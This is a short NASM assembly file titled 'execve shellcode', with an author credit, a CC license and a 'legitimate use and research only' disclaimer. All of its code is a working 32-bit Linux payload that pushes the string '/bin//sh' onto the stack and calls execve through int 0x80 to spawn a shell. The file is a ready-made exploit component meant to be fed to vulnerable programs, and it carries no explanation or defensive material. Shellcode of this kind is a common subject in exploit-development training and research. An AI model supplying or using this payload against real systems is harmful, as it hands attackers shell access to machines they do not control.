; execve shellcode
; Filename: execve.nasm
; Author: Oleg Boytsev
; License http://creativecommons.org/licenses/by-sa/3.0/
; Legitimate use and research only
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

global _start
section .text
_start:

        xor eax, eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push eax
        push ebx
        mov ecx, esp
        xor edx, edx
        mov al, 0xb
        int 0x80
